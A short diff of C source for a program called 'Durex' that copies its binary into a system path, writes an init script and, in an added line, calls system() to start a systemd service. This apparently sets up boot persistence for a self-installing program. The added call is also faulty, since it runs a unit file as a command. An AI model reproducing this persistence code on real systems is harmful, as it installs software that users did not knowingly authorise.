@@ -43,7 +43,7 @@ static int create_file()
 	// creates a Durex file
 	int durex_fd;
 
-	if ((durex_fd = open(BIN_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+	if ((durex_fd = open(BIN_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
 	{
 		(DEBUG) ? printf("Error %d creating 'Durex' file.\n", durex_fd) : 0;
 		return (-1);
@@ -72,7 +72,7 @@ static int init_d()
 	void *obj = NULL;
 	size_t obj_size = 0;
 
-	if ((init_fd = open(INIT_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0)
+	if ((init_fd = open(INIT_DIR, O_WRONLY | O_CREAT | O_TRUNC, 0655)) < 0)
 	{
 		return -1;
 	}
@@ -89,7 +89,7 @@ static int init_d()
 		(DEBUG) ? printf("Error munmap\n") : 0;
 	close(init_fd);
 	// TODO reload init d
-	//
+	system("/etc/systemd/system/Durex.service start");
 	return 0;
 }
 
